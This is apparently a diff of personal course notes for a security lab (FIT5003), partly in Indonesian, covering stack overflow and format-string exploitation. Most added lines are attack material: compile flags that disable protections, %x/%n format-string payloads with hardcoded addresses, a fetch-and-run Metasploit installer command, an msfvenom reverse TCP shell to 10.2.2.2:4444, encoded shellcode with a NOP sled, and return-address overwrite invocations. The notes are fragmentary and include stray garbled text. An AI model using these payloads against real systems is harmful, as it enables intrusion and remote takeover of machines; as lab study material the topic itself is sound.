@@ -28,7 +28,7 @@ curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/t
 
 2. Compile using executable stack
 	gcc -m32 -g -o stack -z execstack -fno-stack-protector stack.c
-
+	gcc -m32 -g -o stack_v2 -z execstack stack.c
 3. 
 
 #### Payload Generation
@@ -243,6 +243,8 @@ AAAAAAAAA %x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%
 
 %x.%x.%x.%x.%x.%x.%x.%s.%x.%x
 
+FIT5003 -> XITx003
+
 | Number     | Hex      |
 | ---------- | -------- |
 | 1448435888 | 565560B0 |
@@ -277,7 +279,7 @@ Please enter a string:
 Segmentation fault (core dumped)
 
 
-
+	gcc -m32 -g -o stack_v2 -z execstack stack.c
 echo -ne "\xb0\x60\x55\x56%61x%5\$n
 
 
@@ -371,7 +373,7 @@ perl -e 'print "\xa0\xa1\x55\x56\xac\xa1\x55\x56"' \
 
 echo $(printf "\xa4\xa1\x55\x56\xac\xa1\x55\x56").%x.%x.%x.%x.%x.%x.%x.%x.%x.AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%n > input
 \xa4\xa1\x55\x56\xac\xa1\x55\x56
-
+run $(perl -e 'print "\x90"x20')
 
 printf "\xa4\xa1\x55\x56".%x.%x.%x.%x.%x.%x.%x.%x.%x.AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%n
 
@@ -426,11 +428,63 @@ echo %x.%x.AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%n > input
 1448452516
 1448452512
 
+565561f9
+
+1448436217
+
 
 
 ![[Pasted image 20250829002533.png]]
 1448452512
 %x.%x.%x.%x.%x.%x.%x.%x.AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%n
 
+FIT5003
 
 test kalau misalkan dia itu cuma 1, 2, 3,4,5,6indoinseisneis;komasl;kmsksmalsmak
+
+
+
+
+gcc -m32 -fno-stack-protector -z execstack -g -o stack stack.c
+
+
+curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb >msfinstall && chmod 755 msfinstall && ./msfinstall
+
+
+![[Pasted image 20250901134113.png]]
+
+
+```bash
+x86/shikata_ga_nai
+```
+
+msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.2.2.2 LPORT=4444 -f c -e x86/shikata_ga_nai
+
+
+
+export SHELLCODE=$(python -c 'print("\x90"*200 + "<paste_your_shellcode_here>")')
+
+
+export SHELLCODE=$(python3 -c 'print("\x90"*200 + "\xb8\x69\xaa\x09\x17\xda\xd9\xd9\x74\x24\xf4\x5f\x31\xc9\xb1\x12\x83\xef\xfc\x31\x47\x0e\x03\x2e\xa4\xeb\xe2\x81\x63\x1c\xef\xb2\xd0\xb0\x9a\x36\x5e\xd7\xeb\x50\xad\x98\x9f\xc5\x9d\xa6\x52\x75\x94\xa1\x95\x1d\x2d\x52\x64\xd2\x59\x50\x68\xfd\xc5\xdd\x89\x4d\x93\x8d\x18\xfe\xef\x2d\x12\xe1\xdd\xb2\x76\x89\xb3\x9d\x05\x21\x24\xcd\xc6\xd3\xdd\x98\xfa\x41\x4d\x12\x1d\xd5\x7a\xe9\x5e")')
+
+
+
+0xffffce73
+
+
+./vuln $(python3 -c 'print("A"*20 + "\x73\xce\xff\xff")')
+
+
+
+caranya, kita buat shellcode -> diexport sebagai env, nah nanti programnya manggil env tersebut
+
+
+./vuln $(python3 -c 'print("\x73\xce\xff\xff")')
+
+
+
+	gcc -m32 -g -o format_string -z execstack -fno-stack-protector format_string.c
+
+
+19x4 nop sled
+
